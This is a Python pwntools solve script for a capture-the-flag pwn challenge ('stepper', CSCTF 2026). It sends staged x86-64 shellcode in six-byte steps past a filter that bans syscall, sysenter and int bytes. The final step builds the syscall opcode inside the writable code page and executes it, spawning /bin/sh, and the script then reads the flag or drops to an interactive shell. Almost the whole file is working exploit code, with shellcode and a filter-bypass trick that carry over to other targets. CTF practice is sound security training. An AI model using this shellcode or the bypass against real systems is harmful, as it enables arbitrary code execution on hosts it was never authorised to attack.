#!/usr/bin/env python3
"""
stepper (CSCTF 2026 Wave 2, Pwn, 900 pts) - staged shellcode past a byte filter.

    ~/venv/bin/python solve.py                 # local, inside the Ubuntu VM
    ~/venv/bin/python solve.py REMOTE HOST=... PORT=...

THE SERVICE
    An 8-byte RWX slot. Each round it is memset to 0x90, our <= 6 bytes are copied to
    code+0, and the slot is entered. code+8 holds `jmp qword ptr [rip+0]` pointing at
    guest_exit, which snapshots all 16 registers into ctx and returns to the host.
        * REGISTERS PERSIST between steps (ctx is restored on entry).
        * THE SLOT DOES NOT - it is rewritten every round.
        * 12 steps, 6 bytes each.
        * bytes 0x0f, 0x05, 0x34, 0xcd are rejected -> no `syscall` (0f 05),
          no `sysenter` (0f 34), no `int` (cd 80).

THE IDEA
    The code page is PROT_EXEC|PROT_WRITE, so the forbidden bytes never have to travel
    over the wire: we assemble them in place. After our <= 6 bytes the slot is padded
    with 0x90 up to code+8, so a final step that writes 0f 05 into code+6 falls straight
    through the padding into the `syscall` it just built. x86 keeps self-modifying code
    coherent, so the write is visible to the very next instruction fetch.

    Registers are set up across the earlier steps; only the last step needs the trick.

    0x050f is itself built arithmetically (0x0a1e >> 1), because writing it as an
    immediate would put 0f and 05 straight into the instruction stream.
"""
import re
import sys

from pwn import args, context, log, process, remote

context.arch = "amd64"
context.log_level = args.LOGLEVEL or "info"

BANNED = {0x0F, 0x05, 0x34, 0xCD}
MAX_STEPS = 12
STEP_SIZE = 6

# Each entry: (raw bytes, what it does). Registers carry over; the slot does not.
#
# NOTE, measured the hard way: the usual 32-bit `push '//sh' ; push '/bin'` pair does
# NOT build the string here. In 64-bit mode `push imm32` pushes EIGHT bytes with the
# immediate sign-extended, so the stack ended up holding "/bin\0\0\0\0" and execve got
# the path "/bin" - it returned ENOENT, the slot fell through to guest_exit, and the
# service calmly printed "step done." and offered step 11. A failed execve looks exactly
# like a payload that never ran. So the qword is assembled in rax instead.
STEPS = [
    (bytes.fromhex("e80000000058"), "call +0 ; pop rax       -> rax = code+5 (PIE leak)"),
    (bytes.fromhex("4889c34831d2"), "mov rbx,rax ; xor rdx,rdx"),
    (bytes.fromhex("52b82f2f7368"), "push rdx (NUL terminator) ; mov eax,'//sh'"),
    (bytes.fromhex("48c1e02031f6"), "shl rax,32 ; xor esi,esi"),
    (bytes.fromhex("b92f62696e"),   "mov ecx,'/bin'"),
    (bytes.fromhex("4809c850"),     "or rax,rcx ; push rax   -> '/bin//sh' on the stack"),
    (bytes.fromhex("4889e7"),       "mov rdi,rsp"),
    (bytes.fromhex("4831c0b03b"),   "xor rax,rax ; mov al,59 -> __NR_execve"),
    (bytes.fromhex("66b91e0a"),     "mov cx, 0x0a1e"),
    (bytes.fromhex("66d1e9"),       "shr cx, 1               -> cx = 0x050f, never typed"),
    (bytes.fromhex("66894b01"),     "mov [rbx+1], cx         -> plants 0f 05 at code+6;"
                                    " execution NOPs into it and syscalls"),
]

FLAG_RE = re.compile(rb"CSCTF\{[^}]{1,64}\}")


def check_payload():
    """Refuse to send anything the service would reject - and say why, not just fail."""
    assert len(STEPS) <= MAX_STEPS, "too many steps: %d > %d" % (len(STEPS), MAX_STEPS)
    for i, (raw, why) in enumerate(STEPS, 1):
        assert 0 < len(raw) <= STEP_SIZE, "step %d is %d bytes (max %d)" % (i, len(raw), STEP_SIZE)
        bad = [hex(b) for b in raw if b in BANNED]
        assert not bad, "step %d contains banned bytes %s" % (i, bad)
    # the planted word really is the syscall opcode, little-endian
    assert (0x0A1E >> 1) == 0x050F
    assert (0x050F).to_bytes(2, "little") == b"\x0f\x05"

    # replay the register arithmetic, so a wrong path is caught here and not by a
    # silent ENOENT on the wire - that is exactly how the first attempt failed.
    rax = 0x68732F2F                      # mov eax,'//sh'
    rax = (rax << 32) & 0xFFFFFFFFFFFFFFFF  # shl rax,32
    rcx = 0x6E69622F                      # mov ecx,'/bin'
    rax |= rcx                            # or rax,rcx
    path = rax.to_bytes(8, "little")
    assert path == b"/bin//sh", "built path is %r, not /bin//sh" % path
    log.success("payload check: %d steps, all <= %d bytes, no banned bytes; path=%r",
                len(STEPS), STEP_SIZE, path.decode())


def start():
    if args.REMOTE:
        host, port = args.HOST, int(args.PORT or 0)
        if not host or not port:
            log.error("REMOTE needs HOST= and PORT=")
        return remote(host, port)
    return process("./stepper")


def send_steps(io):
    for i, (raw, why) in enumerate(STEPS, 1):
        io.recvuntil(b"length> ")
        io.send(b"%d\n" % len(raw))
        io.recvuntil(b"code> ")
        io.send(raw)
        log.info("step %2d: %-14s %s", i, raw.hex(), why)
        if i < len(STEPS):
            io.recvuntil(b"step done.")
    # after the last step the process has become /bin/sh - no "step done." arrives


def main():
    check_payload()
    io = start()
    io.recvuntil(b"forbidden.")
    send_steps(io)

    # we should now be talking to a shell
    io.sendline(b"id; cat /flag* /flag.txt 2>/dev/null; ls -la /")
    data = io.recvrepeat(3)
    sys.stdout.write(data.decode("latin-1", "replace"))

    m = FLAG_RE.search(data)
    if m:
        log.success("FLAG: %s", m.group().decode())
    else:
        log.warning("no flag in output yet - dropping to an interactive shell")
        io.interactive()


if __name__ == "__main__":
    main()
